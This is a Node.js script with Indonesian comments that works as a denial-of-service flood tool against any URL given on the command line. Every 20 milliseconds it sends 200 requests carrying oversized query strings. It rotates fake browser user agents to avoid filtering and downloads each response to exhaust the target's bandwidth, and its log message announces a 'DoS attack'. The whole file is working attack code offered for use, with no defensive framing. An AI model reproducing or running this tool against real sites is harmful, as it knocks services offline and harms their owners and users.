const target = process.argv[2];
const duration = parseInt(process.argv[3]) || Infinity;
const requestsPerInterval = 200; // Tingkatkan untuk permintaan yang lebih tinggi
const interval = 20; // Interval lebih rendah untuk intensitas tinggi

if (!target) {
    console.log('Usage: node Load.js URL [DURATION]');
    process.exit(1);
}

const fetch = require('node-fetch');

// List user agents yang beragam
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    // Tambahkan lebih banyak user agent
];

// Fungsi untuk memilih user agent acak
function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function performAttack() {
    const promises = [];

    for (let i = 0; i < requestsPerInterval; i++) {
        const headers = { 
            "User-Agent": getRandomUserAgent(), 
            "Connection": "keep-alive" 
        };

        // Menambahkan parameter query besar untuk mengonsumsi bandwidth lebih
        const largeQuery = `${target}?q=${'x'.repeat(5000)}`;

        promises.push(
            fetch(largeQuery, { headers })
                .then(res => res.arrayBuffer()) // Mengunduh data mentah untuk memaksimalkan penggunaan bandwidth
                .catch(err => console.error(`Request failed: ${err}`))
        );
    }

    // Tunggu hingga semua permintaan selesai
    await Promise.allSettled(promises);
}

// Memulai serangan yang memakan bandwidth
console.log(`Starting DoS attack on ${target} to consume bandwidth...`);

const attackInterval = setInterval(performAttack, interval);

// Penghentian manual dengan SIGINT (CTRL+C)
process.on('SIGINT', () => {
    clearInterval(attackInterval);
    console.log('\nAttack manually stopped.');
    process.exit(0);
});
